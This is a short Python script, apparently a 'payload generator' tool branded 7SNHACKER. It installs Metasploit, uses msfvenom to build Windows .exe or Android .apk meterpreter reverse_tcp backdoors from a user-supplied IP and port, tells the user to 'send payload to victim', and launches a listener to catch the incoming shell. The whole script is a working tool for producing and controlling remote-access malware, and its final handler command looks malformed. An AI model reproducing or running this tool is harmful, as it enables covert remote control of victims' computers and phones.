import os
os.system("clear")
print("""
███████╗███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
╚════██║██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██╔╝███████╗██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██╔╝ ╚════██║██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║  ███████║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

""")
print("""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝

""")
os.system("apt-get install metasploit -y")
payload = input("payload type android or windows ? ")
os.system("ifconfig")
ip = input("Your ip addres : ")
port = input("Your port : ")
name = input("Payload name ? ")
if payload == "windows":
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe" )
elif payload == "android":
      os.system("msfvenom -p android/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
print("------------------------------")
print("payload save in payloadgen folder")
print("------------------------------")
print("Now send payload to victim")
print("------------------------------")
os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')


